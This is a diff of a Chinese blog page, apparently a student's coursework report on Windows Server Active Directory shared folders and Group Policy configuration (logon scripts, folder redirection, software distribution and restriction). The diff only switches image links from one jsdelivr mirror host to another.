+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191651082.png" alt=""></p>
 <p>至此，我们随便选择3个Administrator和3个xuwp-Nox中的任何1个都可以查看到这些共享文件夹。</p>
 <h4 id="在Active-Directory上查找共享文件夹"><a href="#在Active-Directory上查找共享文件夹" class="headerlink" title="在Active Directory上查找共享文件夹"></a>在Active Directory上查找共享文件夹</h4><p>点击”网络”-“搜索Active Directory”。</p>
 <p>将”查找”处改为”共享文件夹”。</p>
@@ -1247,345 +1247,345 @@ c = a \oplus b\\
 <p>这里我使用通配符*，但并没有发现此前那些共享文件夹，说明这里只能搜索到在AD上发布的共享文件夹。</p>
 <p>事实上，”启用网络发现”的主机也可以看见共享文件夹Server-No1-ADShare，这是不安全的，所以尽量使用Active<br>Directory共享文件夹。</p>
 <p>注：关键字缺省代表搜索所有共享文件夹。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191651442.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191651442.png" alt=""></p>
 <p>右击”Server-No1-ADShare”行，点击”浏览”即可正常读写文件夹。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191651913.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191651913.png" alt=""></p>
 <p>我们在这个共享文件夹中写入一个文件，测试其他主机是否能看到这个文件。</p>
 <p>进入任意一个林中的主机（这里我选用了发布该共享文件的主机），打开文件。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191651692.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191651692.png" alt=""></p>
 <p>刷新后即可发现这个新增的文件。</p>
 <p>有时我们需要经常用到某个共享文件夹，我们可以将其映射到网络驱动器。</p>
 <p>右击”Server-No1-ADShare”行，点击”映射网络驱动器”。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191651623.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191651623.png" alt=""></p>
 <p>在”驱动器”处选择一个喜欢的盘符。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191651862.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191651862.png" alt=""></p>
 <p>回到资源管理器即可发现这个网络驱动器。</p>
 <p>最后附一张位于多个域的共享文件夹查询。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191651751.png" alt=""></p>
-<h2 id="作业展示截图"><a href="#作业展示截图" class="headerlink" title="作业展示截图"></a>作业展示截图</h2><h3 id="域和信任关系的展示截图"><a href="#域和信任关系的展示截图" class="headerlink" title="域和信任关系的展示截图"></a>域和信任关系的展示截图</h3><p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191651352.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191651751.png" alt=""></p>
+<h2 id="作业展示截图"><a href="#作业展示截图" class="headerlink" title="作业展示截图"></a>作业展示截图</h2><h3 id="域和信任关系的展示截图"><a href="#域和信任关系的展示截图" class="headerlink" title="域和信任关系的展示截图"></a>域和信任关系的展示截图</h3><p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191651352.png" alt=""></p>
 <p>Active Directory域和共享关系</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191651261.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191651261.png" alt=""></p>
 <p>xuwp05191643.com属性</p>
-<h3 id="连通性测试截图"><a href="#连通性测试截图" class="headerlink" title="连通性测试截图"></a>连通性测试截图</h3><p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191651041.png" alt=""></p>
+<h3 id="连通性测试截图"><a href="#连通性测试截图" class="headerlink" title="连通性测试截图"></a>连通性测试截图</h3><p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191651041.png" alt=""></p>
 <p>Server-No1 ping Server-No2 和 Server-No3</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191651271.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191651271.png" alt=""></p>
 <p>Server-No2 ping Server-No1 和 Server-No3</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191651160.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191651160.png" alt=""></p>
 <p>Server-No3 ping Server-No1 和 Server-No2</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191651802.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191651802.png" alt=""></p>
 <p>Client-No1 ping Server-No1、Server-No2 和 Server-No3</p>
-<h3 id="林中不同域计算机用户登录客户机的截图"><a href="#林中不同域计算机用户登录客户机的截图" class="headerlink" title="林中不同域计算机用户登录客户机的截图"></a>林中不同域计算机用户登录客户机的截图</h3><p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191652013.png" alt=""></p>
+<h3 id="林中不同域计算机用户登录客户机的截图"><a href="#林中不同域计算机用户登录客户机的截图" class="headerlink" title="林中不同域计算机用户登录客户机的截图"></a>林中不同域计算机用户登录客户机的截图</h3><p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191652013.png" alt=""></p>
 <p>点击开始菜单可以看到的已登录用户</p>
-<h3 id="可查询共享资源截图"><a href="#可查询共享资源截图" class="headerlink" title="可查询共享资源截图"></a>可查询共享资源截图</h3><p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191652091.png" alt=""></p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191652942.png" alt=""></p>
+<h3 id="可查询共享资源截图"><a href="#可查询共享资源截图" class="headerlink" title="可查询共享资源截图"></a>可查询共享资源截图</h3><p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191652091.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191652942.png" alt=""></p>
 <p>文件资源管理器的网络选项</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191652522.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202205191652522.png" alt=""></p>
 <p>在AD上查询共享文件夹</p>
 <h1 id="作业二"><a href="#作业二" class="headerlink" title="作业二"></a>作业二</h1><p>注：本文对图片的说明位于图片上方，因部分图片过大可能造成错页现象。</p>
 <h2 id="系统管理"><a href="#系统管理" class="headerlink" title="系统管理"></a>系统管理</h2><h3 id="准备工作———新建组策略对象"><a href="#准备工作———新建组策略对象" class="headerlink" title="准备工作———新建组策略对象"></a>准备工作———新建组策略对象</h3><p>服务器管理器-工具-组策略管理</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image2.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image2.png" alt=""></p>
 <p>在域”xuwp05191643.com”上设置组策略。</p>
 <p>域-（右键）xuwp05191643.com-在这个域中创建GPO并在此处链接</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image3.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image3.png" alt=""></p>
 <p>【为GPO（组策略对象）设置一个名称】-确定</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image4.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image4.png" alt=""></p>
 <p>展开xuwp05191643.com即可发现组策略对象”CUMT-IS”</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image5.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image5.png" alt=""></p>
 <p>（右击）CUMT-IS即可对其进行编辑。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image6.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image6.png" alt=""></p>
 <p>组策略管理编辑器是可视化的。</p>
 <h3 id="管理模板"><a href="#管理模板" class="headerlink" title="管理模板"></a>管理模板</h3><h4 id="Internet-Explore禁止更改主页"><a href="#Internet-Explore禁止更改主页" class="headerlink" title="Internet Explore禁止更改主页"></a>Internet Explore禁止更改主页</h4><p>用户策略-策略-管理模板：从本地计算机中检索的策略定义（ADMX文件）-Windows组件-Internet<br>Explore-禁用更改主页设置</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image7.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image7.png" alt=""></p>
 <p>已启用-【输入主页】-确定</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image8.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image8.png" alt=""></p>
 <h4 id="禁用控制面板程序control-exe"><a href="#禁用控制面板程序control-exe" class="headerlink" title="禁用控制面板程序control.exe"></a>禁用控制面板程序control.exe</h4><p>注：可禁用的程序可在C:\Windows\System32下找到。</p>
 <p>用户配置-策略-管理模板-系统</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image9.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image9.png" alt=""></p>
 <p>（双击/右击+编辑）不运行指定的Windows程序-已启用-显示-【输入control.exe】</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image10.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image10.png" alt=""></p>
 <h4 id="删除回收站上下文菜单中的”属性”选项"><a href="#删除回收站上下文菜单中的”属性”选项" class="headerlink" title="删除回收站上下文菜单中的”属性”选项"></a>删除回收站上下文菜单中的”属性”选项</h4><p>用户配置-策略-管理模板-桌面</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image11.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image11.png" alt=""></p>
 <p>（双击）删除”回收站”上下文菜单中的”属性”-已启用</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image12.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image12.png" alt=""></p>
 <h4 id="关闭自动播放"><a href="#关闭自动播放" class="headerlink" title="关闭自动播放"></a>关闭自动播放</h4><p>用户配置-策略-管理模板-所有设置</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image13.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image13.png" alt=""></p>
 <p>（双击）关闭自动播放-已启用-CD-ROM和可移动媒体驱动器</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image14.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image14.png" alt=""></p>
 <p>这样的话，插入U盘或其他介质是就不会自动读取内容了，有助于防范计算机病毒。</p>
 <h4 id="下发策略并验证"><a href="#下发策略并验证" class="headerlink" title="下发策略并验证"></a>下发策略并验证</h4><p>最后，我们指定CUMT-IS对XuWanpeng-No1生效。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image15.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image15.png" alt=""></p>
 <p>使用命令\”gpupdate /force\”进行组策略的下发。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image16.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image16.png" alt=""></p>
 <p>使用XuWanpeng-No1登录Client-No1，更新组策略（重启机器、gpupdate、等待后台更新）后进行验证。</p>
 <p>打开IE浏览器，发现主页变为了<a target="_blank" rel="noopener" href="http://cs.cumt.edu.cn/，打开Internet选项，发现主页不可更改，下方提示&quot;某些设置由系统管理员进行管理&quot;。">http://cs.cumt.edu.cn/，打开Internet选项，发现主页不可更改，下方提示&quot;某些设置由系统管理员进行管理&quot;。</a></p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image17.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image17.png" alt=""></p>
 <p>尝试打开控制面板，发现</p>
 <p>无法直接打开控制面板</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image18.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image18.png" alt=""></p>
 <p>无法通过设置打开控制面板</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image19.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image19.png" alt=""></p>
 <p>但事实上，通过Win+Q搜索，仍可以打开控制面板。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image20.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image20.png" alt=""></p>
 <p>回去看看设置时的说明，发现该选项<strong>仅阻止用户运行由文件资源管理器进程启动的程序</strong>。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image21.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image21.png" alt=""></p>
 <p>更改前，（右击）回收站：</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image22.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image22.png" alt=""></p>
 <p>更改后，（右击）回收站：</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image23.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image23.png" alt=""></p>
 <p>发现无法再看见属性选项了。</p>
 <p>插入U盘，将其连接到虚拟机，发现没有弹出自动播放界面。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image24.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image24.png" alt=""></p>
 <h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><h4 id="设置启动脚本"><a href="#设置启动脚本" class="headerlink" title="设置启动脚本"></a>设置启动脚本</h4><p>用户配置-策略-Windows设置-脚本（登录/注销）-登录</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image25.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image25.png" alt=""></p>
 <p>（双击/右击+属性）登录-显示文件</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image26.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image26.png" alt=""></p>
 <p>接着弹出了一个文件夹，其路径为\\xuwp05191643.com\SysVol\xuwp05191643.com\Policies\{CE8870A7-3EC6-40BF-93C8-D67D9458B825}\User\Scripts\Logon</p>
 <p>中间由32个16进制数字组成的字符串为GUID。</p>
 <p>在此处新建一个welcome.vbs，用于弹出msgbox。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image27.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image27.png" alt=""></p>
 <p>尝试运行一下，此时获取的是Server-No1的Administrator用户。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image28.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image28.png" alt=""></p>
 <p>新建hello.txt和hello.bat，hello.bat用于在登录后打开hello.txt。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image29.png" alt=""></p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image30.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image29.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image30.png" alt=""></p>
 <p>完成后</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image31.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image31.png" alt=""></p>
 <p>添加-浏览</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image32.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image32.png" alt=""></p>
 <p>将vbs和bat脚本添加进来。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image33.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image33.png" alt=""></p>
 <h4 id="下发策略并验证-1"><a href="#下发策略并验证-1" class="headerlink" title="下发策略并验证"></a>下发策略并验证</h4><p>使用gpupdate /force强制更新组策略。</p>
 <p>在Client-No1上注销XuWanpeng-No1并重新登录，发现两个脚本成功执行，弹出了欢迎窗口和今日任务。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image34.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image34.png" alt=""></p>
 <h3 id="文件夹重定向"><a href="#文件夹重定向" class="headerlink" title="文件夹重定向"></a>文件夹重定向</h3><h4 id="设置文件夹重定向"><a href="#设置文件夹重定向" class="headerlink" title="设置文件夹重定向"></a>设置文件夹重定向</h4><p>在Client-No1域控上新建一个文件夹C:\Server-No1-My-Documents-Share</p>
 <p>右击-属性-共享-高级共享</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image35.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image35.png" alt=""></p>
 <p>共享此文件夹-权限</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image36.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image36.png" alt=""></p>
 <p>将权限设置为读写</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image37.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image37.png" alt=""></p>
 <p>用户配置-策略-Windows设置-文件夹重定向-文档</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image38.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image38.png" alt=""></p>
 <p>（右击+属性）基本-将每个人的文件夹重定向到同一个位置-【选择根路径为\\CLIENT-NO1\Client-No1-My-Documents-Share】</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image39.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image39.png" alt=""></p>
 <h4 id="下发策略并验证-2"><a href="#下发策略并验证-2" class="headerlink" title="下发策略并验证"></a>下发策略并验证</h4><p>使用gpupdate /force强制更新组策略。</p>
 <p>登录Client-No1，可以在Client-No1的共享文件夹中发现Server-No1共享来的文件夹。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image40.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image40.png" alt=""></p>
 <p>可以查看到Server-No1”文档”中的文件。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image41.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image41.png" alt=""></p>
 <p>在Server-No1中查看”文档”的属性，发现位置已重定向到了Client-No1的共享文件夹中。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image42.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image42.png" alt=""></p>
 <h3 id="软件分发"><a href="#软件分发" class="headerlink" title="软件分发"></a>软件分发</h3><h4 id="设置软件分发"><a href="#设置软件分发" class="headerlink" title="设置软件分发"></a>设置软件分发</h4><p>创建一个专用于共享软件的文件夹Software-Share，并将要发布的msi安装包放入其中。</p>
 <p>用户策略-策略-软件设置-软件安装</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image43.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image43.png" alt=""></p>
 <p>（右击）软件安装-新建-数据包-【键入需要的共享安装程序程序包的完整UNC路径】</p>
 <p>注：不要使用”浏览”按钮访问该位置。确保使用共享安装程序程序包的UNC路径。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image44.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image44.png" alt=""></p>
 <h5 id="“已发布”方式"><a href="#“已发布”方式" class="headerlink" title="“已发布”方式"></a>“已发布”方式</h5><p>已发布-确定</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image45.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image45.png" alt=""></p>
 <p>程序包会在组策略窗口的右窗格中列出。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image46.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image46.png" alt=""></p>
 <h5 id="“已分配”方式"><a href="#“已分配”方式" class="headerlink" title="“已分配”方式"></a>“已分配”方式</h5><p>（右击）属性-部署-【勾选已分配、在登陆时安装此应用程序】</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image47.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image47.png" alt=""></p>
 <h4 id="下发策略并验证-3"><a href="#下发策略并验证-3" class="headerlink" title="下发策略并验证"></a>下发策略并验证</h4><p>域控计算机Server-No1使用gpupdate /force强制更新组策略，需要注销。</p>
 <p>使用xuwp-No1登录客户计算机Client-No1。</p>
 <h5 id="“已发布”方式-1"><a href="#“已发布”方式-1" class="headerlink" title="“已发布”方式"></a>“已发布”方式</h5><p>控制面板-程序-程序和功能-从网络安装程序</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image48.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image48.png" alt=""></p>
 <p>可以在此处发现我们分发的软件。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image49.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image49.png" alt=""></p>
 <p>（双击/单机+安装）发现可以正常安装</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image50.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image50.png" alt=""></p>
 <h5 id="“已分配”方式-1"><a href="#“已分配”方式-1" class="headerlink" title="“已分配”方式"></a>“已分配”方式</h5><p>gpupdate /force后，域控计算机Server-No1显示”正在安装托管软件”</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image51.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image51.png" alt=""></p>
 <p>xuwp-No1登录Client-No1时，显示了很久的欢迎界面。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image52.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image52.png" alt=""></p>
 <p>控制面板-程序-程序和功能</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image53.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image53.png" alt=""></p>
 <p>发现分配的软件已安装。</p>
 <h3 id="软件限制"><a href="#软件限制" class="headerlink" title="软件限制"></a>软件限制</h3><h4 id="设置软件限制"><a href="#设置软件限制" class="headerlink" title="设置软件限制"></a>设置软件限制</h4><p>用户策略-策略-Windows设置-安全设置-软件限制策略</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image54.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image54.png" alt=""></p>
 <p>（右击）软件限制策略-创建软件限制策略</p>
 <p>（右击）其他规则-新建路径规则</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image55.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image55.png" alt=""></p>
 <p>【选择限制软件路径】-【选择安全级别为不允许】</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image56.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image56.png" alt=""></p>
 <p>发现右侧窗格增加了限制软件———控制面板Control.exe</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image57.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image57.png" alt=""></p>
 <p>但事实上，仍然可以通过”搜索”面板打开控制面板，这说明软件限制策略也只能限制从资源管理器启动的软件。</p>
 <p>所以对计算器calc.exe新增一条路径限制，</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image58.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image58.png" alt=""></p>
 <h4 id="下发策略并验证-4"><a href="#下发策略并验证-4" class="headerlink" title="下发策略并验证"></a>下发策略并验证</h4><p>域控计算机Server-No1使用gpupdate /force强制更新组策略，需要注销。</p>
 <p>使用xuwp-No1登录客户计算机Client-No1。</p>
 <p>从文件资源管理器打开calc.exe</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image59.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/SOS_homework2/image59.png" alt=""></p>
 <p>发现受限，且与此前提示不同。</p>
 <h2 id="基于组策略的安全分析"><a href="#基于组策略的安全分析" class="headerlink" title="基于组策略的安全分析"></a>基于组策略的安全分析</h2><p>【控制台输入mmc】</p>
